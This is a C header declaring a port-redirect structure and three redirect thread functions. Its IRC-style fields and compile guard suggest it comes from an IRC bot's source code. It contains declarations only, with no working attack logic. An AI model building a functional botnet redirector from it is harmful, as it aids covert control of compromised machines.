/*****************************************************************************/
/*                                Morgan Copy Right 2005 
/*****************************************************************************/  
#ifndef NO_REDIRECT
// redirect structure.
typedef struct REDIRECT 
{
	SOCKET sock;
	SOCKET csock;
	char dest[128];
	char chan[128];
	int port;
	int lport;
	int threadnum;
	int cthreadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;

} REDIRECT;

DWORD WINAPI RedirectThread(LPVOID param);
DWORD WINAPI RedirectLoopThread(LPVOID param);
DWORD WINAPI RedirectLoop2Thread(LPVOID param);
#endif
